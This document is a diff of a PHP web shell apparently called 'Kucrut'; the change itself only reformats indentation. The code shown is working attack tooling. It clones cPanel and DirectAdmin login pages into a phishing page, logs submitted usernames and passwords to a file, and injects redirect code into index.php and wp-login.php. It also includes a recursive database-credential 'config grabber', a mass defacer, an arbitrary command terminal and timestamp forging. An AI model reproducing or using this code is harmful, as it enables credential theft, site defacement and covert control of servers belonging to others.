-	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
-	echo("</select></div>");
-	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
-	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
-	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
-	$clone_page = $_POST['kucrut1'];
-	$fake_root = $_POST['kucrut2'];
-	$logto = $_POST['kucrut4'];
-	$panel = $_POST['kucrut5'];
-	$inject_to = $_POST['kucrut6'];
-	$bind_on = $_POST['kucrut7'];
-	$count = $_POST['kucrut8'];
-	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['kucrut3'] == '>>'){
-		echo __pre();
-		$target = $clone_page;
-		$curl = new KucrutCURL();
-		$source_page = $curl->Send($target);
-		if(!empty($source_page)){
-			$matched_form = "";
-			if($panel == "cpanel"){
-				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
-					$matched_form = $match[0];
-				}
-			}else{
-				if(preg_match('#<form(.*?)>#', $source_page, $match)){
-					$matched_form = $match[0];
-				}
-			}
-			if(!empty($matched_form)){
-				$fake = "";
-				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
-				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
-				if($panel == "cpanel"){
-					$port = "2083";
-				}else{
-					$target = str_replace(array("http://", "https://"), "", $target);
-					$port = explode(":",$target);
-					$port = $port[1];
-				}
-				if(substr($uri, 0, 1) == "/"){
-					$uri = substr($uri, 1);
-				}
-				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
-				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
-				if($panel == "cpanel"){
-					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
-				}else{
-					$form = '<form action="'.$log_url.'" method="post">';
-				}
-				$fake = str_replace($matched_form, $form, $source_page);
-				if(@!is_dir($fake_root)){
-					@mkdir($fake_root, 0777, true);
-				}
+    kucruthead();
+    KucrutNum(9,10);
+    echo '<div class=header><br>
+    <center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
+    <div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
+    $cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
+    foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
+    echo("</select></div>");
+    echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
+    <div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
+    <div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
+    <div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
+    <div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
+    <div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
+    <div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
+    $clone_page = $_POST['kucrut1'];
+    $fake_root = $_POST['kucrut2'];
+    $logto = $_POST['kucrut4'];
+    $panel = $_POST['kucrut5'];
+    $inject_to = $_POST['kucrut6'];
+    $bind_on = $_POST['kucrut7'];
+    $count = $_POST['kucrut8'];
+    if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['kucrut3'] == '>>'){
+        echo __pre();
+        $target = $clone_page;
+        $curl = new KucrutCURL();
+        $source_page = $curl->Send($target);
+        if(!empty($source_page)){
+            $matched_form = "";
+            if($panel == "cpanel"){
+                if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
+                    $matched_form = $match[0];
+                }
+            }else{
+                if(preg_match('#<form(.*?)>#', $source_page, $match)){
+                    $matched_form = $match[0];
+                }
+            }
+            if(!empty($matched_form)){
+                $fake = "";
+                $pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
+                $uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
+                if($panel == "cpanel"){
+                    $port = "2083";
+                }else{
+                    $target = str_replace(array("http://", "https://"), "", $target);
+                    $port = explode(":",$target);
+                    $port = $port[1];
+                }
+                if(substr($uri, 0, 1) == "/"){
+                    $uri = substr($uri, 1);
+                }
+                $uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
+                $log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
+                if($panel == "cpanel"){
+                    $form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
+                }else{
+                    $form = '<form action="'.$log_url.'" method="post">';
+                }
+                $fake = str_replace($matched_form, $form, $source_page);
+                if(@!is_dir($fake_root)){
+                    @mkdir($fake_root, 0777, true);
+                }
 
-				$cookie_name = "kucrut_fakepage_counter" . rand(9999,99999);
+                $cookie_name = "kucrut_fakepage_counter" . rand(9999,99999);
 
-				$post_user = 'user';
-				$post_pass = 'pass';
-				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
-				if($panel != "cpanel"){
-					$post_user = 'username';
-					$post_pass = 'password';
-					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
-				}
+                $post_user = 'user';
+                $post_pass = 'pass';
+                $resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
+                if($panel != "cpanel"){
+                    $post_user = 'username';
+                    $post_pass = 'password';
+                    $resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
+                }
 
-				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';
+                $cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';
 
-				@file_put_contents($fake_root.'/log.php', $cpanel_log);
+                @file_put_contents($fake_root.'/log.php', $cpanel_log);
 
-				if($panel == "cpanel"){
-					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
-				}
+                if($panel == "cpanel"){
+                    $fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
+                }
 
-				@file_put_contents($fake_root.'/index.php', $fake);
+                @file_put_contents($fake_root.'/index.php', $fake);
 
-				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
-				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';
+                $inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
+                $bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';
 
-				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
-				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));
+                @file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
+                @file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));
 
-				echo "success...!";
-			}else{
-				echo "failed...!";
-			}
-		}else{
-			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
-		}
-	}
-	echo '</div>';
-	kucrutfooter();
+                echo "success...!";
+            }else{
+                echo "failed...!";
+            }
+        }else{
+            echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
+        }
+    }
+    echo '</div>';
+    kucrutfooter();
 }
 function kucrutarchive_manager(){
-	kucruthead();
-	$file = $_POST['kucrut2'];
-	if(!file_exists($file)){
-		$file = $GLOBALS['cwd'];
-	}
-	$rand_id = rand(9999, 999999);
-	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
-	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
-	<div class="txtfont">
-	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
-	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	if($_POST['kucrut5']=='>>'){
-		//echo __pre();
-		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
-		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
-		__kucrut_open_archive_file($file, $rand_id);
-		echo '</div>';
-	}
-	echo '</div>';
-	kucrutfooter();
+    kucruthead();
+    $file = $_POST['kucrut2'];
+    if(!file_exists($file)){
+        $file = $GLOBALS['cwd'];
+    }
+    $rand_id = rand(9999, 999999);
+    echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
+    echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
+    <div class="txtfont">
+    Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
+    <input type="submit" name="btn" value=" "></div></form></center><br>';
+    if($_POST['kucrut5']=='>>'){
+        //echo __pre();
+        echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
+        echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
+        __kucrut_open_archive_file($file, $rand_id);
+        echo '</div>';
+    }
+    echo '</div>';
+    kucrutfooter();
 }
 function __kucrut_open_archive_file($arch, $base_id=0){
-	try{
-		$files = array();
-		$dirs = array();
-		$archive = new PharData($arch);
-		 foreach($archive as $file) {
-			 $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
-		     if($file->isDir()) {
-				 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
-		     }else{
-				 $file_size = @filesize($file->getPathname());
-				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
-			 }
-		 }
-		 function __kucrut_open_archive_usort($a, $b){
-			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
-		 }
-		 usort($dirs, "__kucrut_open_archive_usort");
-		 usort($files, "__kucrut_open_archive_usort");
-		 $files = array_merge($dirs, $files);
-		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
-		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
-		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="kucrutOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
-		 foreach($files as $file){
-			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
-			 if($file["type"] == "dir"){
-			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="kucrutOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
-		 	}else{
-				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".kucrutSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
+    try{
+        $files = array();
+        $dirs = array();
+        $archive = new PharData($arch);
+         foreach($archive as $file) {
+             $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
+             if($file->isDir()) {
+                 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
+             }else{
+                 $file_size = @filesize($file->getPathname());
+                 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
+             }
+         }
+         function __kucrut_open_archive_usort($a, $b){
+             return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
+         }
+         usort($dirs, "__kucrut_open_archive_usort");
+         usort($files, "__kucrut_open_archive_usort");
+         $files = array_merge($dirs, $files);
+         echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
+         $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
+         echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="kucrutOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
+         foreach($files as $file){
+             $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
+             if($file["type"] == "dir"){
+                echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="kucrutOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
+            }else{
+                echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".kucrutSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
 
-			}
-		 }
-		  echo '</table>';
-	}catch(Exception $e){
-		echo("0");
-	}
+            }
+         }
+          echo '</table>';
+    }catch(Exception $e){
+        echo("0");
+    }
 }
 function kucrutopen_archive_dir(){
-	$dir = $_POST["kucrut1"];
-	$base_id = $_POST["kucrut2"];
-	__kucrut_open_archive_file($dir, $base_id);
+    $dir = $_POST["kucrut1"];
+    $base_id = $_POST["kucrut2"];
+    __kucrut_open_archive_file($dir, $base_id);
 }
 function kucrutconfig_grabber(){
-	kucruthead();
-	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
-	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
-	<div class="txtfont">
-	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
-	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
-	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	$dir = $_POST['kucrut2'];
-	$ext = $_POST['kucrut3'];
-	if($_POST['kucrut5']=='>>'){
-		echo __pre();
-		Kucrut_ConfigGrabber($dir, $ext);
-	}
-	echo '</div>';
-	kucrutfooter();
+    kucruthead();
+    echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
+    echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
+    <div class="txtfont">
+    Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
+    Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
+    <input type="submit" name="btn" value=" "></div></form></center><br>';
+    $dir = $_POST['kucrut2'];
+    $ext = $_POST['kucrut3'];
+    if($_POST['kucrut5']=='>>'){
+        echo __pre();
+        Kucrut_ConfigGrabber($dir, $ext);
+    }
+    echo '</div>';
+    kucrutfooter();
 }
 function Kucrut_ConfigGrabber($dir, $ext) {
-	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
-	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
-	if(@is_readable($dir)){
-		$globFiles = @glob("$dir/*.$ext");
-		$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
-		$blacklist = array();
-		foreach ($globDirs as $dir) {
-			if(!@is_readable($dir)||@is_link($dir)) continue;
-			@Kucrut_ConfigGrabber($dir, $ext);
-		}
-		foreach ($globFiles as $file){
-			$filee = @file_get_contents($file);
-			if(preg_match($pattern, $filee)){
-				echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
-			}
-		}
-	}
+    $pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
+    $db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
+    if(@is_readable($dir)){
+        $globFiles = @glob("$dir/*.$ext");
+        $globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
+        $blacklist = array();
+        foreach ($globDirs as $dir) {
+            if(!@is_readable($dir)||@is_link($dir)) continue;
+            @Kucrut_ConfigGrabber($dir, $ext);
+        }
+        foreach ($globFiles as $file){
+            $filee = @file_get_contents($file);
+            if(preg_match($pattern, $filee)){
+                echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
+            }
+        }
+    }
 }
 function kucrutsearcher(){
 kucruthead();
@@ -6262,8 +6262,8 @@ kucruthead();
 KucrutNum(5,6,7,8,9,10);
 echo "<div class=header><center><p><div class='txtfont_header'>| Mass Defacer |</div></p><form onSubmit=\"g('MassDefacer',null,this.massdir.value,this.defpage.value,this.method.value,'>>');return false;\" method='post'>";
 echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
-	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
-	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
+    Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
+    DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
 </form>';
 $dir = $_POST['kucrut1'];
 $defpage = $_POST['kucrut2'];
@@ -6536,24 +6536,24 @@ function json_decode($json, $array=true){
 }
 }
 function kucrutterminalExec(){
-	$pwd = "pwd";
-	$seperator = ";";
-	if($GLOBALS['sys']!='unix'){
-		$pwd = "cd";
-		$seperator = "&";
-	}
-	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
-	$current_path = '';
-	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['kucrut1'], $match)){
-		if(empty($match[1])){
-			$match[1] = $match[2];
-		}
-		$current_path = kucrutEx("cd ".addslashes($match[1]).$seperator.$pwd);
-		$current_path = str_replace("\\", "/", $current_path);
-	}
-	$out = kucrutEx($cmd.$_POST['kucrut1'], true);
-	$out = htmlspecialchars($out);
-	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
+    $pwd = "pwd";
+    $seperator = ";";
+    if($GLOBALS['sys']!='unix'){
+        $pwd = "cd";
+        $seperator = "&";
+    }
+    if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
+    $current_path = '';
+    if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['kucrut1'], $match)){
+        if(empty($match[1])){
+            $match[1] = $match[2];
+        }
+        $current_path = kucrutEx("cd ".addslashes($match[1]).$seperator.$pwd);
+        $current_path = str_replace("\\", "/", $current_path);
+    }
+    $out = kucrutEx($cmd.$_POST['kucrut1'], true);
+    $out = htmlspecialchars($out);
+    echo json_encode(array("output" => convertBash($out), "path" => $current_path));
 }
 function convertBash($code) {
     $dictionary = array(
@@ -6571,124 +6571,124 @@ function convertBash($code) {
     return $htmlString;
 }
 function kucrutdoActions(){
-	$chdir_fals = false;
-	if(!@chdir($_POST['c'])){
-		$chdir_fals = true;
-		$kucrut_canruncmd = _kucrut_can_runCommand(true,true);
-	}
-	if(isset($_POST['kucrut1']))$_POST['kucrut1'] = rawurldecode($_POST['kucrut1']);
-	if(isset($_POST['kucrut2']))$_POST['kucrut2'] = rawurldecode($_POST['kucrut2']);
-	$action = $_POST["kucrut3"];
-	if($action == "permission"){
-		$perms = 0;
-		$perm = $_POST["kucrut2"];
-		for($i=strlen($perm)-1;$i>=0;--$i){
-			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
-		}
-		if(@chmod($_POST['kucrut1'], $perms)){
-			echo("done");
-		}else{
-			echo("no");
-		}
-		return;
-	}
-	if($action == "rename" || $action == "move"){
-		$kucrut1_decoded = $_POST['kucrut1'];
-		if($chdir_fals){
-			$_POST['kucrut1'] = $_POST["c"]."/".$_POST["kucrut1"];
-		}
-		$_POST['kucrut1'] = trim($_POST['kucrut1']);
-		$kucrut1_escape = addslashes($_POST["kucrut1"]);
-		if($_POST["kucrut3"] == "rename"){
-			$_POST['kucrut2'] = basename($_POST['kucrut2']);
-		}
-		if(!empty($_POST['kucrut2'])){
-			$cmd_rename = false;
-			if($chdir_fals&&$kucrut_canruncmd){
-				if(_kucrut_is_writable($_POST['kucrut1'])){
-					$cmd_rename = true;
-					$kucrut1_escape = addslashes($kucrut1_decoded);
-					kucrutEx("cd '".addslashes($_POST['c'])."';mv '".$kucrut1_escape."' '".addslashes($_POST['kucrut2'])."'");
-				}
-			}
-			if(!file_exists($_POST['kucrut2'])){
-				if(@rename($_POST['kucrut1'], $_POST['kucrut2'])||$cmd_rename){
-					echo "done";
-				}else{
-					echo "no";
-				}
-			}else{
-				echo "no";
-			}
-		}
-	}elseif($action == "copy"){
-		if(is_dir($_POST["kucrut1"])){
-			$dir = str_replace('//', '/', $_POST["kucrut1"]);
-			$dir = explode('/', $dir);
-			if(empty($dir[count($dir) - 1])){
-				$name = $dir[count($dir) - 2];
-			}else{
-				$name = $dir[count($dir) - 1];
-			}
-		}else{
-			$name = basename($_POST["kucrut1"]);
-		}
-		$dir = dirname($_POST["kucrut1"]);
-		if($dir == "."){
-			$dir = $_POST["c"]."/";
-		}
-		if(is_file($_POST["kucrut1"])){
-			@copy($_POST["kucrut1"], $_POST["kucrut2"]);
-			echo("done");
-		}elseif(is_dir($_POST["kucrut1"])){
-			if(!is_dir($_POST["kucrut2"])){
-				mkdir($_POST["kucrut2"], 0755, true);
-			}
-			copy_paste($dir, $name , $_POST["kucrut2"] . "/");
-			echo("done");
-		}
-	}elseif($action == "modify"){
-		if( !empty($_POST['kucrut1']) ) {
-			$time = strtotime($_POST['kucrut1']);
-			if($time){
-				$touched = false;
-				if($chdir_fals&&$kucrut_canruncmd){
-					kucrutEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['kucrut1']))."' '".addslashes($_POST['kucrut2'])."'");
-					$touched = true;
-				}
-				if(!@touch($_POST['kucrut2'],$time,$time)&&!$touched){
-					echo 'no';
-				}else{
-					echo 'ok';
-				}
-			} else{
-				 echo 'badtime';
-			}
-		}
-	}
+    $chdir_fals = false;
+    if(!@chdir($_POST['c'])){
+        $chdir_fals = true;
+        $kucrut_canruncmd = _kucrut_can_runCommand(true,true);
+    }
+    if(isset($_POST['kucrut1']))$_POST['kucrut1'] = rawurldecode($_POST['kucrut1']);
+    if(isset($_POST['kucrut2']))$_POST['kucrut2'] = rawurldecode($_POST['kucrut2']);
+    $action = $_POST["kucrut3"];
+    if($action == "permission"){
+        $perms = 0;
+        $perm = $_POST["kucrut2"];
+        for($i=strlen($perm)-1;$i>=0;--$i){
+            $perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
+        }
+        if(@chmod($_POST['kucrut1'], $perms)){
+            echo("done");
+        }else{
+            echo("no");
+        }
+        return;
+    }
+    if($action == "rename" || $action == "move"){
+        $kucrut1_decoded = $_POST['kucrut1'];
+        if($chdir_fals){
+            $_POST['kucrut1'] = $_POST["c"]."/".$_POST["kucrut1"];
+        }
+        $_POST['kucrut1'] = trim($_POST['kucrut1']);
+        $kucrut1_escape = addslashes($_POST["kucrut1"]);
+        if($_POST["kucrut3"] == "rename"){
+            $_POST['kucrut2'] = basename($_POST['kucrut2']);
+        }
+        if(!empty($_POST['kucrut2'])){
+            $cmd_rename = false;
+            if($chdir_fals&&$kucrut_canruncmd){
